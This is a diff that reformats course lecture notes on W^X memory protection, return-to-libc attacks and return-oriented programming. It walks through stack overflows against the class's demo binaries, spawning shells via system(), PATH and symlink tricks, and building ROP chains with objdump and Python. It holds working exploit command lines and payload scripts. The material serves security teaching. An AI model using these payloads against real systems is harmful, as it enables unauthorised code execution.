@@ -1,7 +1,6 @@
 # Unit 7: WxorX and ROP
 
-Write xor Execute Settings
-==========================
+# Write xor Execute Settings
 
 So far, in all of our exploits on the stack, we've been assuming that
 the memory mapped for the stack is set to be executable. That is, we
@@ -9,8 +8,8 @@ would overwrite the return address and the have it jump somewhere else
 on the stack (say to our shell code) and that code would execute.
 
 This setting is *not* the common setting for modern machines. There is a
-principle called "Write xor Execute" or $w \otimes x$ which states that
-a memory page should either be writable or executable but not both.
+principle called "Write xor Execute" or *w* ⊗ *x* which states that a
+memory page should either be writable or executable but not both.
 
 What does this mean in practice? Let's take a look at our dummy exploit
 code.
@@ -32,7 +31,7 @@ int main(int argc, char *argv[]){
 
 And we were to compile with our standard options:
 
-``` {.example}
+``` example
 gcc -fno-stack-protector -z execstack -Wno-format-security dummy_exploit.c   -o dummy_exploit
 ```
 
@@ -40,7 +39,7 @@ You'll notice one option `-z execstack` which says that we are allowed
 to have the stack set to executable. Using this program, we can launch a
 shell with our standard shell code:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./dummy_exploit $(printf `./hexify.sh smallest_shell`)
 $ 
 ```
@@ -48,7 +47,7 @@ $
 But, let's run this under gdb first so we can pause the program and see
 the memory maps.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ gdb -q dummy_exploit 
 Reading symbols from dummy_exploit...done.
 (gdb) br main
@@ -89,7 +88,7 @@ If you look closely, you'll see the line for the stack and permissions
 `rwxp` which means that this memory region is all read, writable, and
 executable. But, we can turn this off with a gcc flag:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ gcc -fno-stack-protector -Wno-format-security dummy_exploit.c   -o dummy_exploit
 user@si485H-base:demo$ ./dummy_exploit $(printf `./hexify.sh smallest_shell`)
 Segmentation fault (core dumped)
@@ -98,7 +97,7 @@ Segmentation fault (core dumped)
 Now we do not get a shell, but instead we get a segmentation fault. If
 we run this under gdb to look at the maps, the permissions has changed.
 
-``` {.example}
+``` example
 gdb) br main
 Breakpoint 1 at 0x8048420
 (gdb) r
@@ -135,8 +134,7 @@ write-xor-execute principles? The answer is, we do not inject our own
 shell code anymore, but we rather use the code that already exists and
 is already executable to do the job for us.
 
-Return to Libc
-==============
+# Return to Libc
 
 While we might not be able to inject our own shell code into the process
 via the stack, we are in a position where we can still use other code to
@@ -159,7 +157,7 @@ int main(int argc, char * argv[]){
 }
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./system_shell 
 $ 
 ```
@@ -168,8 +166,7 @@ Essentially, we use the `system()` mini-shell to launch a real `/bin/sh`
 shell. That's great, but what does this have to do with exploits? Why
 can't we overwrite a return address to jump there?
 
-Overwriting Return Addresses with `system()`
---------------------------------------------
+## Overwriting Return Addresses with `system()`
 
 For this example, we'll work the vulnerable program we've been using so
 far in class:
@@ -210,7 +207,7 @@ this exploit, namely, the `system()` function.
 The first thing we need to do is determine *where* the `system()` call
 is loaded.
 
-``` {.example}
+``` example
 (gdb) br main
 Breakpoint 1 at 0x804852a: file vulnerable.c, line 29.
 (gdb) r 
@@ -228,7 +225,7 @@ that in the normal way.
 
 We can find the length of the buffer to the exploit:
 
-``` {.example}
+``` example
 080484d5 <vuln>:
  80484d5:   55                      push   ebp
  80484d6:   89 e5                   mov    ebp,esp
@@ -257,20 +254,19 @@ We can find the length of the buffer to the exploit:
 
 Then we can setup the overflow:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\xef\xbe\xad\xde'"`
 Segmentation fault (core dumped)
 user@si485H-base:demo$ dmesg | tail -1
 [ 2138.032640] vulnerable[2283]: segfault at deadbeef ip deadbeef sp bffff690 error 15
 ```
 
-Jumping to system
------------------
+## Jumping to system
 
 Once the exploit is setup, now we only need to replace 0xdeadbeef with
 0xb7e5a190 to jump the system call:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\x90\xa1\xe5\xb7'"`
 sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
 Segmentation fault (core dumped)
@@ -287,7 +283,7 @@ we provided to the program. So we can control what get's called to it,
 and moreover, the system() command accepts valid bash directives. so we
 can do the following:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable 10 `python -c "cmd='/bin/sh;';print cmd+'A'*(0x2c+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
 $
 ```
@@ -297,20 +293,19 @@ of our input string so that it will execute the shell. But there is
 still a bunch of A's to follow that will cause an error, and exiting the
 program, does just that:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable 10 `python -c "cmd='/bin/sh;';print cmd+'A'*(0x2c+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
 $ 
 sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
 Segmentation fault (core dumped)
 ```
 
-Why this worked so easily
--------------------------
+## Why this worked so easily
 
 In our example, we got really lucky, because we control the argument to
 `/bin/sh`. Let's take a look at the disassemble of `vuln`:
 
-``` {.example}
+``` example
 Dump of assembler code for function vuln:
    0x080484d5 <+0>: push   ebp
    0x080484d6 <+1>: mov    ebp,esp
@@ -341,7 +336,7 @@ End of assembler dump.
 If you look at the stack alignment at this point, we get the following
 for the vulnerable function prior to the leave/ret:
 
-``` {.example}
+``` example
          .---------.
          |  str    | ----> "/bin/sh;AAAAAAAAAAAAAAAAAAA"
          |---------|
@@ -357,7 +352,7 @@ for the vulnerable function prior to the leave/ret:
 
 After the leave/return we are left with this:
 
-``` {.example}
+``` example
 
   ebp -> ???
 
@@ -367,12 +362,11 @@ After the leave/return we are left with this:
   esp -> |   n     |
          '---------'
                         eip: system+0x0
-
 ```
 
 We can further look at the code for system:
 
-``` {.example}
+``` example
 Dump of assembler code for function __libc_system:
    0xb7e5a190 <+0>: push   ebx
    0xb7e5a191 <+1>: sub    esp,0x8                      
@@ -399,8 +393,7 @@ system call, and it just so happens that the argument to system when
 `do_system()` is called needs to be the **second** value on the stack,
 which is exactly what we have! This might not always be the case.
 
-Harder Return to Lib C
-======================
+# Harder Return to Lib C
 
 Let's now look at what it takes to do a return to libc attack where we
 don't get lucky with the stack alignment. Here's another vulnerable
@@ -431,7 +424,7 @@ int main(int argc, char *argv[]){
 
 We can do a stack smash alignment like last time:
 
-``` {.example}
+``` example
 0804844d <vuln>:
  804844d:   55                      push   ebp
  804844e:   89 e5                   mov    ebp,esp
@@ -450,7 +443,7 @@ We can do a stack smash alignment like last time:
 
 Now when we run our exploit we get:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
 /bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???
 sh: 1: 4: not found
@@ -459,13 +452,12 @@ Segmentation fault (core dumped)
 
 We don't get what we want. But, the game is not up.
 
-Using Sym Linking and PATH manipulation
----------------------------------------
+## Using Sym Linking and PATH manipulation
 
 If you look closely, you see the error, "4: not found", but let's take a
 closer look at this error under `strace`.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ strace -f ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
 execve("./harder", ["./harder", "/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAA"...], [/* 20 vars */]) = 0
 (...)
@@ -493,7 +485,7 @@ path. All we need to do is create a file along the execution path for
 
 To start, let's create a symbolic link to /bin/sh called "4\\17\\2":
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ln -s /bin/sh $(printf "4\17\2")
 user@si485H-base:demo$ ls -l 4^O^B 
 lrwxrwxrwx 1 user user 7 Nov 24 10:04 4?? -> /bin/sh
@@ -502,7 +494,7 @@ lrwxrwxrwx 1 user user 7 Nov 24 10:04 4?? -> /bin/sh
 Now, we just need to edit the `PATH` environment variable to put this
 along the path lookup:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ export PATH=.:$PATH
 user@si485H-base:demo$ echo $PATH
 .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
@@ -510,7 +502,7 @@ user@si485H-base:demo$ echo $PATH
 
 Now, let's exploit away:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
 /bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???
 $ 
@@ -518,8 +510,7 @@ $
 
 Boom shell!
 
-Jumping to the Exploit String
------------------------------
+## Jumping to the Exploit String
 
 Another option is to write an address to the stack where `system()` will
 use it as its argument. Consider that we have control of the stack at
@@ -530,7 +521,7 @@ Consider this version of the exploit again this time, I'm going to use
 0xdeadbeef for the address of system and then 0xcafebabe for the address
 where the address of "/bin/sh" should be.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\xef\xbe\xad\xde' + 'BBBB' + '\xbe\xba\xfe\xca'"`
 /bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ?AAAA????
 Segmentation fault (core dumped)
@@ -546,7 +537,7 @@ where "/bin/sh;" lives.
 Consider again, that after the return and leave, the stack looks like
 this:
 
-``` {.example}
+``` example
 
   ebp -> ???
 
@@ -573,7 +564,7 @@ that. That means, if we replace 0xcafebabe with
 0xbffff690-0x28-8=0xbffff660, we should get the exploit we want. Let's
 give it a try:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x60\xf6\xff\xbf'"`
 /bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBB`???
 Segmentation fault (core dumped)
@@ -583,7 +574,7 @@ That didn't work --- I think that `system()` messed up our string in
 some way, but now we are in the range. Let's keep trying addresses up
 from there:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x60\xf6\xff\xbf'"`
 /bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???BBBB`???
 Segmentation fault (core dumped)
@@ -603,7 +594,7 @@ Now, we've got something cooking. System is trying to execute some input
 we provided. Let's just make the rest of the string "/bin/sh;" and maybe
 we'll get lucky:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./harder `python -c "cmd='/bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;';print cmd+'A'*(0x28+4-len(cmd))+'\x90\xa1\xe5\xb7' + 'BBBB' + '\x70\xf6\xff\xbf'"`
 /bin/sh;/bin/sh;/bin/sh;/bin/sh;/bin/sh;AAAA???BBBBp???
 $ 
@@ -611,8 +602,7 @@ $
 
 So while we didn't get the first one, we eventually found a "/bin/sh".
 
-Return Oriented Programming: Function Chaining Gadgets
-======================================================
+# Return Oriented Programming: Function Chaining Gadgets
 
 Return Oriented Programming or (ROP) is the process of using small
 sequences of code (or gadgets) that are embedded in other code. The
@@ -636,10 +626,9 @@ chain function calls together, but we will also look at an example where
 the ROP itself, without calling any other function, is capable of
 launching a shell. Also note, that ll the code we are working with in
 this lesson are compiled *without* executable stacks, so we can't easily
-load shell code [^1].
+load shell code [1].
 
-Overwriting the return address with function calls
---------------------------------------------------
+## Overwriting the return address with function calls
 
 Let's start with a simple example of where ROPs become very useful.
 Consider the following code where we want bad() to get called
@@ -673,7 +662,7 @@ the return the address for vuln() with bad(). To do this, first we can
 look at the disassembled code to see where the buffer is declared into
 relation to the return address:
 
-``` {.example}
+``` example
 ser@si485H-base:demo$ objdump -d -M intel call_bad
 (...)
 0804847d <bad>:
@@ -706,15 +695,14 @@ ser@si485H-base:demo$ objdump -d -M intel call_bad
 We see that the buffer is allocated at `ebp-0x6c` so we can quickly do
 the exploit like so where we jump to bad():
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./call_bad `python -c "print 'A'*(0x6c+4) + '\x7d\x84\x04\x08'"`
 Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}?
 You've been PWNED!
 Segmentation fault (core dumped)
 ```
 
-Functions with Arguments
-------------------------
+## Functions with Arguments
 
 We can make the exploit a little more intriguing if we were to make so
 that bad() will call system() with it's argument:
@@ -752,7 +740,7 @@ properly aligned with the right argument, namely `pwn`, then we'll get a
 shell to launch. For that to happen, we'll need the exploit on the stack
 to look like this:
 
-``` {.example}
+``` example
 |     <addr pwn>     |
 |  bad's ret address |
 |     <addr bad>     |
@@ -766,7 +754,7 @@ bad, which should be pwn.
 To complete this exploit, we determine the address of pwn and bad, and
 give it a go.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ gdb -q call_bad_sh
 Reading symbols from call_bad_sh...done.
 (gdb) x/x pwn
@@ -779,13 +767,11 @@ user@si485H-base:demo$ ./call_bad_sh `python -c "print 'A'*(0x6c+4) + '\xad\x84\
 Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?????,?
 You've been PWNED!
 $ 
-
 ```
 
 That's not too bad.
 
-Chaining Two Functions with Arguments
--------------------------------------
+## Chaining Two Functions with Arguments
 
 Let's add a bit more complexity to this exploit. Suppose now we want to
 make a call to another function first before calling bad(), and the
@@ -827,41 +813,41 @@ void main(int argc, char * argv[]){
 }
 ```
 
-This time we need to first call bin~sh~() with magicbeef being deadbeef
-and then we need to call bad() afterwards to get our shell. This might
-seem like no problem, at first, but once we try it out, you'll see where
-the challenge arises.
+This time we need to first call bin<sub>sh</sub>() with magicbeef being
+deadbeef and then we need to call bad() afterwards to get our shell.
+This might seem like no problem, at first, but once we try it out,
+you'll see where the challenge arises.
 
 Starting with the easy part, we can look at what the stack should be to
-properly call bin~sh~:
+properly call bin<sub>sh</sub>:
 
-``` {.example}
+``` example
 |      0xdeadbeef       |
 |  bin_sh's ret address |
 |     <addr bin_sh>     |
 ```
 
-We overwrite the return address of vuln() with the address of bin~sh~()
-where it's arguments is 0xdeadbeef. Before, in the last example, we
-didn't consider the return address of the function we jumped to, but
-this time we have to. What is the next function we call? bad(). So what
-we really need for the stack is to look like this.
+We overwrite the return address of vuln() with the address of
+bin<sub>sh</sub>() where it's arguments is 0xdeadbeef. Before, in the
+last example, we didn't consider the return address of the function we
+jumped to, but this time we have to. What is the next function we call?
+bad(). So what we really need for the stack is to look like this.
 
-``` {.example}
+``` example
 |     <addr pwn>        |
 |      0xdeadbeef       |
 |     <addr bad>        |
 |     <addr bin_sh>     |
 ```
 
-If you follow the stack, the argument to bin~sh~() is 0xdeadbeef and its
-return address is bad(). The argument to bad() is `pwn`, and the return
-address for bad is 0xdeadbeef, which doesn't matter because at this
-point we have the shell.
+If you follow the stack, the argument to bin<sub>sh</sub>() is
+0xdeadbeef and its return address is bad(). The argument to bad() is
+`pwn`, and the return address for bad is 0xdeadbeef, which doesn't
+matter because at this point we have the shell.
 
 Let's give it a try:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ gdb -q call_bad_chain
 Reading symbols from call_bad_chain...done.
 (gdb) x/x pwn
@@ -880,14 +866,13 @@ $
 
 It's a shell! Great.
 
-Chaining Three or More Functions with Arguments
------------------------------------------------
+## Chaining Three or More Functions with Arguments
 
 It's about to fall apart. Consider what happens when we need to call
 another function in this chain. Where could it go? Right now we have
 this.
 
-``` {.example}
+``` example
 |     <addr pwn>        |
 |      0xdeadbeef       | <-- bad's return addres is bin_sh's argument
 |     <addr bad>        |
@@ -895,8 +880,9 @@ this.
 ```
 
 The slot for bad's return address is already being used for the argument
-to bin~sh~. We're hosed. Worse, consider what would happen in this code
-example where one of the functions needs to take **two** arguments:
+to bin<sub>sh</sub>. We're hosed. Worse, consider what would happen in
+this code example where one of the functions needs to take **two**
+arguments:
 
 ``` c
 #include <stdio.h>
@@ -949,10 +935,11 @@ the functions requires *two* arguments. Looks like our luck ran out and
 this is impossible, but just in case, let's try looking at the stack
 anyway.
 
-Starting with the first function add~bin~ and it's two arguments which
-should be followed by `add_sh`, we'd need something like this:
+Starting with the first function add<sub>bin</sub> and it's two
+arguments which should be followed by `add_sh`, we'd need something like
+this:
 
-``` {.example}
+``` example
 |      0x0badf00d      |
 |      0xcafebade      |
 |      <addr add_sh>   |
@@ -960,17 +947,17 @@ should be followed by `add_sh`, we'd need something like this:
 ```
 
 That's possible, but then what happens: we've reached an impasse.
-add~sh~() takes one argument and the way the stack is alligned, that
-argument is 0x0badf00d. That's just not what we need --- we need
+add<sub>sh</sub>() takes one argument and the way the stack is alligned,
+that argument is 0x0badf00d. That's just not what we need --- we need
 0xdeadbeef.
 
 It would seem like this is impossible, but think about what we could do
 if we were able to clear the stack. Suppose we had a gadget or little
 function that only did pop;pop;ret then we could jump there instead of
-add~sh~() and clear out the stack before the next return. Something like
-the following:
+add<sub>sh</sub>() and clear out the stack before the next return.
+Something like the following:
 
-``` {.example}
+``` example
 |     <addr pwn>         |
 |     0xdeadbeef         |
 |     <addr bad>         |
@@ -981,15 +968,14 @@ the following:
 |     <addr add_bin>     |
 ```
 
-If you follow the function chain, after ad~bin~() is called with
-arguments 0xcafebade and 0x0badf00d, the next function to run is a
+If you follow the function chain, after ad<sub>bin</sub>() is called
+with arguments 0xcafebade and 0x0badf00d, the next function to run is a
 gadget that pops 0xcafebabe and 0x0badf00d off the stack. When the
-gadget returns, the next address on the stack is add~sh~() with the
-argument 0xdeadbeef. The return address of add~sh~() is bad(), and thus
-the exploit completes.
+gadget returns, the next address on the stack is add<sub>sh</sub>() with
+the argument 0xdeadbeef. The return address of add<sub>sh</sub>() is
+bad(), and thus the exploit completes.
 
-ROP Gadgets
-===========
+# ROP Gadgets
 
 We've been doing a bit of return oriented programming already, but now
 we really get into it. The big idea was to chain a bunch of functions
@@ -1006,15 +992,14 @@ because it unintentionally gives us the functionality we need, and it
 ends in a return statement so it can be chained with other function
 calls.
 
-Hunting a Gadget
-----------------
+## Hunting a Gadget
 
 The key now is to hunt down the gadget we need. For that, we can use
 objdump and grep. For reference the -A option with grep prints the
 specified number of lines *after* a match, and the -B option with grep
 prints the specified number of lines *before* a match.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel call_bad_doublechain | grep -B 3  ret | grep -A 3 pop  
  8048335:   5b                      pop    ebx
  8048336:   c3                      ret    
@@ -1051,14 +1036,13 @@ important with this gadget is that we don't care to where the data is
 being popped, to any of the registers is fine, as long as it is being
 popped off the stack.
 
-Using the gadget
-----------------
+## Using the gadget
 
 With this information in place, we can complete the exploit by first
 identifying the other important address and lining up our stack like
 below:
 
-``` {.example}
+``` example
 |     <addr pwn>         |
 |     0xdeadbeef         |
 |     <addr bad>         |
@@ -1071,7 +1055,7 @@ below:
 
 We can use gdb to find the other addresses:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ gdb -q call_bad_doublechain
 Reading symbols from call_bad_doublechain...done.
 (gdb) x/x add_bin
@@ -1103,8 +1087,7 @@ You've been PWNED!
 $ 
 ```
 
-Where do we go from here?
--------------------------
+## Where do we go from here?
 
 In this example, we used a gadget within the code that did a simple task
 of chaining functions with different numbers of arguments. What if we
@@ -1114,8 +1097,7 @@ exploits, and believe it or not, you can do a *complete* exploit with
 shell code using *only* small gadgets. And, yes, it is as awesome as it
 sounds!
 
-ROP Chains
-==========
+# ROP Chains
 
 The concepts of Return Oriented Programming are really powerful.
 Previously, we saw where we can use a gadget to manipulate the stack so
@@ -1135,8 +1117,7 @@ bytes? It doesn't really matter where we find those bytes as long as
 they do what we need. The key is finding all the gadgets we need to get
 the job done and then chaining those gadgets together.
 
-The goal for our ROP chain
---------------------------
+## The goal for our ROP chain
 
 The basic concept of ROP chaining is that a gadget is a small set of
 instructions, one or two, followed by a return. If we were to write the
@@ -1171,7 +1152,7 @@ that, we can do anything. It means we can do arbitrary system calls to
 do arbitrary work. To start, let's remember how we would normally print
 an 'A' in x86:
 
-```asm
+``` asm
 section .txt
  global _start
 
@@ -1202,7 +1183,7 @@ easily find some gadgets that meet these instructions. Now the challenge
 is to find the codes we are interested in, but the crux of the matter is
 getting the following registers set up:
 
-``` {.example}
+``` example
 
   eax 0x3
   ebx 0x1
@@ -1214,23 +1195,21 @@ getting the following registers set up:
 If we can get that, then we can write an 'A' to stdout, or any arbitrary
 string we choose.
 
-Building a ROP chain from scratch
-=================================
+# Building a ROP chain from scratch
 
 The first thing we need to do in order to build a ROP chain is to find
 gadgets. First we will look at doing this manually by searching for
 gadgets using `objdump` and `grep`. Latter we'll look at doing this in a
 more automated fashion.
 
-Finding Some Useful Gadgets
----------------------------
+## Finding Some Useful Gadgets
 
 Let's use objdump and grep to get things started. Recall that the `-A`
 option says to print two lines after a match, and the `-B` options says
 to print two lines before a match. If we do just a general search, the
 first kind of gadgets that apear are all in the pop;pop;ret category.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | head -31
  80481c6:   83 c4 08                add    esp,0x8
  80481c9:   5b                      pop    ebx
@@ -1263,7 +1242,6 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | head -3
  8048922:   5e                      pop    esi
  8048923:   5f                      pop    edi
  8048924:   c3                      ret    
-
 ```
 
 These are all usable gadgets because they allow us to set registers
@@ -1278,11 +1256,11 @@ which we will need to find:
     memory
 
 We already have at least a few of those above. For example, already, we
-have found a lot of useful gadgets, such as: `pop esi;pop edi;
-ret;`. This will allow us to arbitrarily set the value of edi and esi
-like following:
+have found a lot of useful gadgets, such as: `pop esi;pop edi; ret;`.
+This will allow us to arbitrarily set the value of edi and esi like
+following:
 
-``` {.example}
+``` example
 
  |  <next gadget >        |
  |   value for edi        |
@@ -1290,12 +1268,11 @@ like following:
  | <pop esi;pop edi; ret> |
 ```
 
-Building a useful chain
------------------------
+## Building a useful chain
 
 Let's look for a bit more useful gadgets:
 
-``` {.example}
+``` example
 objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 -B 1 xor
 (...)
 --
@@ -1308,7 +1285,7 @@ This gadget will zero out eax and set the value of ebx! Or if we just
 jump to the xor, simply zero out the value for eax. We also need a
 gadget to increment the value in eax:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 -B 1 inc 
 (...)
 --
@@ -1320,7 +1297,7 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A
 And we need a gadget to write to memory based on a register, something
 like `mov DWORD[edx],eax`
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 "DWORD PTR \[edx\],eax"
 (...)
  809a70d:   89 02                   mov    DWORD PTR [edx],eax
@@ -1332,14 +1309,13 @@ Now we have everything we need except a place to write too. For that we
 can use any old place in the data segment. Turns out 0x080ea060 is
 perfect for that.
 
-Write an "A\\0" to memory ROP chain
------------------------------------
+## Write an "A\\0" to memory ROP chain
 
 If we can find the *right* gadgets, then writing a ROP chain to just
 write "A\\0" to a memory location is actually rather straight forward.
 It should look something like this:
 
-``` {.example}
+``` example
     | <mov [edx],eax;ret> | write '0000' to address 0x080ea61
     | 0x080ea061           | next byte after 0x80ea61
     | <pop edx; ret>      | store next value in edx
@@ -1359,7 +1335,7 @@ string "A\\0" at address 0x080ea061.
 
 Let's find the right gadgets. First we need `pop edx;ret`:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 4 ret | grep -A 4 "pop.*edx" 
  806e97a:   5a                      pop    edx
  806e97b:   c3                      ret   
@@ -1368,7 +1344,7 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 4 ret | grep -A
 Then we need a pop `pop eax; ret`. Unfortunately, finding this is
 harder, and unfortunately, the one I found does a bunch of other stuff:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 4 ret | grep -A 4 "pop.*eax" 
  809e08a:   58                      pop    eax
  809e08b:   5b                      pop    ebx
@@ -1380,7 +1356,7 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 4 ret | grep -A
 But that's fine, we can handle that. And, we already have the `mov`
 command:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A 2 "DWORD PTR \[edx\],eax"
 (...)
  809a70d:   89 02                   mov    DWORD PTR [edx],eax
@@ -1390,7 +1366,7 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 2 ret | grep -A
 
 The last thin we need is `xor` eax command:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 1 ret | grep -A 1 "xor.*eax,eax" 
  8054200:   31 c0                   xor    eax,eax
  8054202:   c3                      ret    
@@ -1399,7 +1375,7 @@ user@si485H-base:demo$ objdump -d -M intel vulnerable  | grep -B 1 ret | grep -A
 
 This means we can put together the chain like so:
 
-``` {.example}
+``` example
 0x0809a70d  | <mov [edx],eax;ret> | write '0000' to address 0x080ea61
 0x080ea061  | 0x080ea061          | next byte after 0x80ea61
 0x0806e97a  | <pop edx; ret>      | store next value in edx
@@ -1420,14 +1396,13 @@ handled. These pop's will clear the stack of values, so we need to add
 some values on the stack, 0xdeadbeef's, so we don't interfere with the
 rest of the chain.
 
-Executing the ROP Chain
------------------------
+## Executing the ROP Chain
 
 One problem with ROP chains is that they are long, much longer then
 something we can just casually type on the command line. It then makes
 sense to store it in a file, and python is the right tool for the job.
 
-``` {.example}
+``` example
 p = 'A'*0x70 #put padding here
 
 p += pack('<I', 0x0806e97a) #pop edx; ret
@@ -1444,7 +1419,6 @@ p += pack('<I', 0x080ea061) #address to write to
 p += pack('<I', 0x0809a70d) # mov [edx],eax;ret
 p += pack('<I', 0xcafebabe) #  will segfault here
 print p 
-
 ```
 
 Note that the `pack('<I',0xdeadbeef)` will create a properly formatted
@@ -1453,7 +1427,7 @@ string in reverse order from the presentation above. I also places a
 0xcafebabe in there so we can know if we segfaulted and reached the end
 of our ropchain, so let's try it out and see if we get there:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
 Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`??
 Segmentation fault (core dumped)
@@ -1463,17 +1437,15 @@ user@si485H-base:demo$ dmesg | tail -1
 
 Hmm. It did not work, why? Well look closely a the `ip` we segfaulted on
 0xbf00e080. There is a null byte in there, and also that looks a lot
-like the address for our `pop eax; pop ebx; pop esi; pop edi;
-ret;` at 0x0809e080. The 0x098 did not wite onto the stack, and the
-reason for that is 0x09 is '\\t' (tab) and that terminated the
-`strcpy()`.
+like the address for our `pop eax; pop ebx; pop esi; pop edi; ret;` at
+0x0809e080. The 0x098 did not wite onto the stack, and the reason for
+that is 0x09 is '\\t' (tab) and that terminated the `strcpy()`.
 
 It turns out that not all of our gadgets that we find can be used
 because the address may contain values we can't include in the overflow.
 Looks like we need to hunt for more gadgets!
 
-Gadgets within Other Operations
--------------------------------
+## Gadgets within Other Operations
 
 One thing we can leverage here is that x86 is not a fixed size
 instruction set. Instead, any sequence of bytes could be a valid
@@ -1485,7 +1457,7 @@ To start, it is worthwhile to know that byte 0xc3 is the return
 operation and address 0x58 is the `pop eax` instruction. In that case,
 we can do a search for that address and find:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d -M intel vulnerable  |  grep -B 2 "c3" | grep -A 2 58
 (...)
 80bb744:    8b 40 58                mov    eax,DWORD PTR [eax+0x58]
@@ -1497,7 +1469,7 @@ And there, within that mov instruction, we see that there is a 0x58
 followed by a 0xc3. That means we can use address 0x080bb746 in our ROP
 chain. Now we can use the following rop chain:
 
-``` {.example}
+``` example
 p += pack('<I', 0x0806e97a) #pop edx; ret
 p += pack('<I', 0x080ea060) #address to write to
 p += pack('<I', 0x080bb746) #pop eax; ret
@@ -1512,7 +1484,7 @@ p += pack('<I', 0xcafebabe) #  will segfault here
 
 And if we test it to see if we get to the 0xcafebabe:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./vulnerable `python rop_chain.py`
 Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAz`F?
 ?                                                                                                                       AAAA
@@ -1526,8 +1498,7 @@ Seems like we need a better way because we can continue to explore for
 these embedded gasgets, but thats a lot of work. Thankfully, there are
 tools to make this a lot easier.
 
-Automated Gadget Hunting
-------------------------
+## Automated Gadget Hunting
 
 Because it's a pain in the ass to find the ROP gadgets by hand, people
 have developed automated tools for both finding gadgets and
@@ -1540,7 +1511,7 @@ While ROPgadget does all sorts of cool things, we'll primarily use it to
 find gadgets for us. Here's the most basic usage where I am just
